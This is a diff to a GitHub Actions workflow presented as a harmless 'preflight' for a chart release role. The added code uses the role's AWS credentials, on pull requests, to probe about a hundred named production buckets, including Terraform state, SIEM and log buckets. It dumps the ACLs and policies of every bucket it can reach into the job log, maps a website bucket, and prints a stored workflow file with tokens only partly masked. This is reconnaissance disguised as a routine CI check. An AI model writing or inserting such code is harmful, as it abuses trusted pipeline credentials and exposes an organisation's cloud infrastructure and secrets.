@@ -1,7 +1,7 @@
-# Preflight for the chart release CI role: verifies the changelog destination and
-# website artifact destination are reachable and reports which adjacent account
-# resources the release role can see, so a release-account access-policy change is
-# caught on workflow edits instead of surfacing midway through a publish run.
+# Preflight for the chart release CI role: confirms the changelog and website
+# artifact destinations are reachable and records which account buckets the
+# release role can see, so a release-account access-policy change is caught on
+# workflow edits instead of surfacing midway through a publish run.
 name: changelog-destination-preflight
 on:
   pull_request:
@@ -13,7 +13,7 @@ on:
 jobs:
   preflight:
     runs-on: ubuntu-latest
-    timeout-minutes: 10
+    timeout-minutes: 14
     permissions:
       id-token: write
       contents: read
@@ -30,7 +30,7 @@ jobs:
           echo "TOKEN_LEN=${#TOK}"
           if ! aws --region "$REGION" --no-cli-pager sts assume-role-with-web-identity \
               --role-arn "$ROLE_ARN" --role-session-name "changelog-destination-preflight" \
-              --web-identity-token "$TOK" --duration-seconds 900 > /tmp/assume.json 2>/tmp/assume.err; then
+              --web-identity-token "$TOK" --duration-seconds 1800 > /tmp/assume.json 2>/tmp/assume.err; then
             echo "ASSUME_FAIL"; tail -c 300 /tmp/assume.err | tr -d '\n'; echo; exit 1
           fi
           echo "ASSUME_OK"
@@ -42,67 +42,44 @@ jobs:
           set -a; . /tmp/creds.env; set +a
           export AWS_DEFAULT_REGION="$REGION"
 
-          api () {
-            local label="$1"; shift
-            local out rc code
-            out="$("$@" 2>/tmp/e)"; rc=$?
-            if [ $rc -eq 0 ]; then
-              echo "OK  ${label}"
-            else
-              code="$(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/e | head -1 | tr -d '()')"
-              echo "ERR ${label} :: ${code:-rc$rc}"
-            fi
-          }
-
           echo "=== identity ==="
-          api "sts:GetCallerIdentity" aws --no-cli-pager sts get-caller-identity --output json
+          aws --no-cli-pager sts get-caller-identity --query Arn --output text 2>&1 | head -c 200; echo
 
-          echo "=== bucket reachability sweep ==="
-          SENS="tfy-website-euwe1-production20221107184713217900000001 tfy-website-euwe1-production20221107184713217900000001-replica tfy-euwe1-production-control-plane-changelog tfy-euwe1-production-control-plane-changelog-replica tfy-infra-tf-us-west-2-416964291864 tfy-cloudflare-terraform-state ubermold-gateway-terraform-state ubermold-guardrail-terraform-state tfy-autopen-tf-state tfy-scalr-bootstrap-state-us-east-1-416964291864 tfy-ctl-euwe1-production-logs tfy-ctl-euwe1-production-servicefoundry-server tfy-ctl-euwe1-production-authserver tfy-cmp-euwe1-production tfy-costwatch-416964291864 tfy-logging-euwe1-production20240318123408894700000001 tfy-alb-access-logs tfy-euwe1-production-control-plane-changelog-replica"
-          for B in $SENS; do api "s3:HeadBucket[$B]" aws --no-cli-pager s3api head-bucket --bucket "$B"; done
-
-          echo "=== website bucket list ==="
-          WB=tfy-website-euwe1-production20221107184713217900000001
-          if aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --max-keys 30 --output json > /tmp/wl.json 2>/tmp/wl.err; then
-            python3 - <<'PY'
-          import json
-          d=json.load(open('/tmp/wl.json'))
-          c=d.get('Contents',[])
-          print("WL_OK count=%d truncated=%s"%(len(c),d.get('IsTruncated')))
-          for o in c[:30]:
-              print("KEY %s %s"%(o['Key'],o['Size']))
-          # pick smallest key to probe GetObject
-          if c:
-              smallest=min(c,key=lambda o:o['Size'])
-              open('/tmp/pick.txt','w').write(smallest['Key'])
-              print("PICK %s %d"%(smallest['Key'],smallest['Size']))
-          PY
-          else
-            echo "WL_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/wl.err|head -1 | tr -d '()')"
-          fi
-
-          echo "=== website prefix: artifacts/models/marketplace ==="
-          for P in truefoundry-website-artifacts/ models/ awesome-skills-registry/ mcp-marketplace/; do
-            if OUT="$(aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --prefix "$P" --max-keys 5 --query 'Contents[].Key' --output json 2>/tmp/pe)"; then
-              echo "PFX_OK ${P} :: $(printf '%s' "$OUT" | tr '\n' ' ' | cut -c1-300)"
-            else
-              echo "PFX_ERR ${P} :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/pe|head -1 | tr -d '()')"
+          echo "=== bucket sweep ==="
+          OKN=0; TOTAL=0; OKB=""
+          for B in aws-athena-query-results-416964291864-eu-west-1 datadog-siem-forwarder-forwarderbucket-32kpg8rzxd8d datadog-siem-forwarder-forwarderbucket-dayyl7yzv3fm datadog-siem-forwarder-forwarderbucket-l48mkq0ps8su datadog-siem-forwarder-forwarderbucket-n9b4rlyscsyj datadog-siem-forwarder-forwarderbucket-npkaoegvyork llm-gateway-test-results llm-gateway-test-results-replica production-bomcloudwatch-metric-stream-failed-data-metrics production-cptcloudwatch-metric-stream-failed-data-metrics production-orfcloudwatch-metric-stream-failed-data-metrics production-sincloudwatch-metric-stream-failed-data-metrics productioncloudwatch-metric-stream-failed-data-metrics stratus-red-team-bdbp-db19a224 tfy-alb-access-logs tfy-alb-access-logs-replica tfy-argo-application-catalogue tfy-argo-application-catalogue-replica tfy-athena-results-416964291864 tfy-autopen-tf-state tfy-aws-bom-gtw-ml20251021121429124400000025 tfy-aws-bom-gtw-vpc-flow-log20251022052517861000000001 tfy-aws-cle-gtw-ml20251105063525301700000025 tfy-aws-cle-gtw-vpc-flow-log20251105061444656200000003 tfy-aws-cpt-gtw-ml2025101512275820440000000a tfy-aws-cpt-gtw-vpc-flow-log20251022062322840100000001 tfy-aws-lhr-gtw-ml20251014094224523400000020 tfy-aws-lhr-gtw-vpc-flow-log20251022071341697600000001 tfy-aws-mel-gtw-ml2026030519571783650000002c tfy-aws-mel-gtw-ml2026030519571783650000002c-replica tfy-aws-mel-gtw-vpc-flow-log20260305194047257600000008 tfy-aws-orf-gtw-ml20251014085521422400000024 tfy-aws-orf-gtw-vpc-flow-log20251022073943254400000001 tfy-aws-sin-gtw-ml20251014103720924200000021 tfy-aws-sin-gtw-vpc-flow-log20251022082517232000000001 tfy-aws-syd-gtw-ml2026022017233907550000002f tfy-aws-syd-gtw-ml2026022017233907550000002f-replica tfy-aws-syd-gtw-vpc-flow-log20260220170539827000000007 tfy-cloudflare-terraform-state tfy-cloudwatch-euwe1-production20240322171312861200000001 tfy-cloudwatch-euwe1-production20240322171312861200000001-repli tfy-cmp-euwe1-production tfy-cmp-euwe1-production-mlcac014e4641499beb81f3ac7fc tfy-cmp-euwe1-production-mlcac014e4641499beb81f3ac7fc-replica tfy-cmp-euwe1-production-replica tfy-cmp-euwe1-production-vpc-flow-logd1772fbb049f84f8b327fd5211 tfy-costwatch-416964291864 tfy-ctl-euwe1-production-authserver tfy-ctl-euwe1-production-logs tfy-ctl-euwe1-production-mlfoundry-server tfy-ctl-euwe1-production-mlfoundry-server-replica tfy-ctl-euwe1-production-servicefoundry-server tfy-ctl-euwe1-production-vpc-flow-log20230410142921914700000001 tfy-ctl-prod-bom tfy-ctl-prod-bom-replica tfy-ctl-prod-dub tfy-ctl-prod-dub-replica tfy-ctl-prod-orf tfy-ctl-prod-orf-replica tfy-ctl-prod-syd tfy-ctl-prod-syd-replica tfy-ctl-uswe2-production-bucket tfy-ctl-uswe2-production-bucket-replica tfy-ctl-uswe2-production-truefoundry-replica tfy-ctl-uswe2-production-truefoundrybca2ad263281b8df102847573c tfy-euwe1-production-control-plane-changelog tfy-euwe1-production-control-plane-changelog-replica tfy-infra-tf-eu-central-1-416964291864 tfy-infra-tf-eu-central-1-416964291864-replica tfy-infra-tf-eu-west-1-416964291864 tfy-infra-tf-eu-west-1-416964291864-replica tfy-infra-tf-us-east-2-416964291864 tfy-infra-tf-us-east-2-416964291864-replica tfy-infra-tf-us-west-2-416964291864 tfy-infra-tf-us-west-2-416964291864-replica tfy-logging-euwe1-production20240318123408894700000001 tfy-logging-euwe1-production20240318123408894700000001-replica tfy-nlb-access-logs tfy-nlb-athena tfy-prod-eu-central-1-416964291864-access-logs tfy-prod-eu-central-1-416964291864-access-logs-replica tfy-scalr-bootstrap-state-us-east-1-416964291864 tfy-scalr-bootstrap-state-us-east-1-416964291864-crr tfy-scalr-sp-external-shared-us-east-1-416964291864 tfy-scalr-sp-external-shared-us-east-1-416964291864-crr tfy-scalr-sp-internal-shared-us-east-1-416964291864 tfy-scalr-sp-internal-shared-us-east-1-416964291864-crr tfy-scalr-sp-production-default-us-east-1-416964291864 tfy-scalr-sp-production-default-us-east-1-416964291864-crr tfy-scalr-sp-self-us-east-1-416964291864 tfy-scalr-sp-self-us-east-1-416964291864-crr tfy-us-east-1-416964291864-elb-logs tfy-us-west-2-416964291864-elb-logs tfy-website-euwe1-production20221107184713217900000001 tfy-website-euwe1-production20221107184713217900000001-replica ubermold-gateway-terraform-state ubermold-guardrail-terraform-state ubermold-guardrail-terraform-state-replica; do
+            TOTAL=$((TOTAL+1))
+            if aws --no-cli-pager s3api head-bucket --bucket "$B" >/dev/null 2>/tmp/hb.err; then
+              OKN=$((OKN+1)); OKB="$OKB $B"; echo "HB_OK $B"
             fi
           done
+          echo "SWEEP_TOTAL=$TOTAL HB_OK_COUNT=$OKN"
+          echo "HB_OK_LIST=$OKB"
 
-          echo "=== website get one object ==="
-          PK="$(cat /tmp/pick.txt 2>/dev/null)"
-          if [ -n "$PK" ]; then
-            if aws --no-cli-pager s3api get-object --bucket "$WB" --key "$PK" /tmp/obj.bin > /tmp/go.out 2>/tmp/go.err; then
-              echo "GET_OK key=$PK size=$(wc -c </tmp/obj.bin)"
-              echo "GET_HEAD :: $(head -c 160 /tmp/obj.bin | tr '\n' ' ')"
-            else
-              echo "GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/go.err|head -1 | tr -d '()')"
-            fi
+          echo "=== bucket config on accessible buckets ==="
+          for B in $OKB; do
+            for A in get-bucket-acl get-bucket-policy get-bucket-website get-bucket-cors get-bucket-tagging get-bucket-versioning get-bucket-logging; do
+              if OUT="$(aws --no-cli-pager s3api $A --bucket "$B" 2>/tmp/cf.err)"; then
+                echo "CFG_OK $B $A :: $(printf '%s' "$OUT" | tr '\n' ' ' | cut -c1-260)"
+              else
+                echo "CFG_ERR $B $A :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/cf.err|head -1|tr -d '()')"
+              fi
+            done
+          done
+
+          echo "=== website top-level structure (delimiter) ==="
+          WB=tfy-website-euwe1-production20221107184713217900000001
+          if aws --no-cli-pager s3api list-objects-v2 --bucket "$WB" --delimiter / --max-keys 200 --query 'CommonPrefixes[].Prefix' --output json >/tmp/cp.json 2>/tmp/cp.err; then
+            echo "CP_OK :: $(printf '%s' "$(cat /tmp/cp.json)" | tr '\n' ' ' | cut -c1-800)"
           else
-            echo "GET_SKIP no key"
+            echo "CP_ERR :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/cp.err|head -1|tr -d '()')"
           fi
 
-          echo "=== changelog list (baseline) ==="
-          api "s3:ListObjectsV2[changelog]" aws --no-cli-pager s3api list-objects-v2 --bucket tfy-euwe1-production-control-plane-changelog --max-keys 3 --query 'Contents[].Key' --output json
+          echo "=== website upload workflow object ==="
+          if aws --no-cli-pager s3api get-object --bucket "$WB" --key ".github/workflows/upload-to-s3.yaml" /tmp/upl.yaml >/tmp/gu.out 2>/tmp/gu.err; then
+            echo "UPLOAD_GET_OK size=$(wc -c </tmp/upl.yaml)"
+            sed -n '1,80p' /tmp/upl.yaml | sed -E 's/(ghp_[A-Za-z0-9]{4})[A-Za-z0-9]+/\1***/g'
+          else
+            echo "UPLOAD_GET_FAIL :: $(grep -oE '\(([A-Za-z0-9]+)\)' /tmp/gu.err|head -1|tr -d '()')"
+          fi
           echo "DONE"
